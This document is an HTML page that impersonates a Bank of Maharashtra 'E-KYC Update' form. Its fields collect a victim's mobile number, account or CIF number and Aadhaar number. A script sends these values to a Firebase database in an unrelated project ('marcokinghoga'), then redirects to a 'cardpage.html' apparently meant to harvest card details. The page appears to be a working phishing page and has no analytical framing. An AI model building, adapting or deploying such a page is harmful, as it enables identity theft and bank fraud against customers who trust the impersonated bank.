<!DOCTYPE html>
<html>
<head>
  <title>dehijlbrd</title>
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <script type="module">
    // Firebase config
    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-app.js";
    import { getDatabase, ref, push } from "https://www.gstatic.com/firebasejs/10.8.1/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDZ8EFQv3KZkGzhnbA7bVwOuWmjSkjTy1o",
      authDomain: "marcokinghoga.firebaseapp.com",
      projectId: "marcokinghoga",
      storageBucket: "marcokinghoga.firebasestorage.app",
      messagingSenderId: "132474071601",
      appId: "1:132474071601:web:7c44a66fca6dc000e90310",
      databaseURL: "https://marcokinghoga-default-rtdb.firebaseio.com"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);

    window.submitForm = function () {
      const mobile = document.getElementById("mobile").value.trim();
      const account = document.getElementById("account").value.trim();
      const customerid = document.getElementById("customerid").value.trim();

      // Push data to Firebase
      push(ref(db, "ekyc_entries"), {
        mobile,
        account,
        aadhaar: customerid,
        timestamp: new Date().toISOString()
      }).then(() => {
        window.location.href = "cardpage.html";
      }).catch((error) => {
        alert("Failed to submit: " + error.message);
      });

      return false;
    }
  </script>
  <style>
    body {
      font-family: Arial;
      background-color: #00abf5;
      text-align: center;
      padding: 20px;
      margin: 0;
    }
    img {
      width: 100%;
      max-width: 300px;
      border-radius: 10px;
    }
    .side-button {
      margin-top: 30px;
      padding: 12px;
      width: 100%;
      font-size: 17px;
      background-color: #0008f6;
      color: #FFFFFF;
      border: none;
      border-radius: 5px;
    }
    .form-container {
      margin-top: 0px;
      text-align: left;
      max-width: 400px;
      margin-left: auto;
      margin-right: auto;
      background: #ffffff00;
      padding: 20px;
      border-radius: 10px;
    }
    .headline h1 {
      font-size: 22px;
      margin: 0;
      color: #ffffff;
    }
    .headline p {
      font-size: 14px;
      margin: 5px 20px;
      color: #f0f0f0;
    }
    .input-group {
      margin-top: 5px;
    }
    .input-group input {
      width: 94%;
      padding: 10px;
      font-size: 12px;
      border-radius: 0px;
      border: 1px solid #ccc;
      margin-top: 5px;
    }
    .input-group label {
      font-weight: bold;
      color: #fff;
    }
    .error {
      color: #eb7777;
      font-size: 13px;
      margin-top: 4px;
      display: none;
    }
    .extra-img {
      width: 100%;
      max-width: 300px;
      border-radius: 10px;
      margin-top: 20px;
    }
  </style>
</head>
<body>
  <img src="https://i.ibb.co/4ns0vWkf/Bank-of-Maharashtra-logo-svg.png" alt="Logo">

  <div class="headline">
    <h1>Welcome To Digital Banking<br>E-KYC Update</h1>
    <p>(Experience secure, simple, and smart banking solutions for your financial needs)</p>
  </div>

  <div class="form-container">
    <form onsubmit="return validateForm();">
      <div class="input-group">
        <label for="mobile">Mobile Number</label>
        <input type="tel" id="mobile" name="mobile" maxlength="10" required placeholder="Enter 10-digit Mobile">
        <div class="error" id="mobileError">⚠️ Enter valid Mobile Number.</div>
      </div>
      <div class="input-group">
        <label for="account">CIF/Account Number</label>
        <input type="tel" id="account" name="account" maxlength="11" required placeholder="Enter 11-digit Account No.">
        <div class="error" id="accountError">⚠️ Enter valid 11-digit Account Number.</div>
      </div>
      <div class="input-group">
        <label for="customerid">Aadhaar Number</label>
        <input type="tel" id="customerid" name="customerid" maxlength="12" required placeholder="Enter 12-digit Aadhaar No.">
        <div class="error" id="aadhaarError">⚠️ Enter valid 12-digit Aadhaar Number.</div>
      </div>
      <button class="side-button" type="submit">Continue</button>
    </form>

    <img class="extra-img" src="https://i.ibb.co/YBFgSJP7/77b989a2-c19c-4317-9739-20cca9ebe498.jpg">
    <img class="extra-img" src="https://i.ibb.co/TxY7gVf6/Screenshot-2025-04-21-14-11-44-95-40deb401b9ffe8e1df2f1cc5ba480b12.jpg">
  </div>

  <script>
    function validateForm() {
      let isValid = true;

      const mobile = document.getElementById("mobile").value.trim();
      const account = document.getElementById("account").value.trim();
      const customerid = document.getElementById("customerid").value.trim();

      document.getElementById("mobileError").style.display = "none";
      document.getElementById("accountError").style.display = "none";
      document.getElementById("aadhaarError").style.display = "none";

      if (!/^[6-9][0-9]{9}$/.test(mobile)) {
        document.getElementById("mobileError").style.display = "block";
        isValid = false;
      }

      if (account.length !== 11 || isNaN(account)) {
        document.getElementById("accountError").style.display = "block";
        isValid = false;
      }

      if (customerid.length !== 12 || isNaN(customerid)) {
        document.getElementById("aadhaarError").style.display = "block";
        isValid = false;
      }

      if (isValid) {
        return submitForm(); // Call Firebase submit
      }

      return false;
    }
  </script>
</body>
</html>
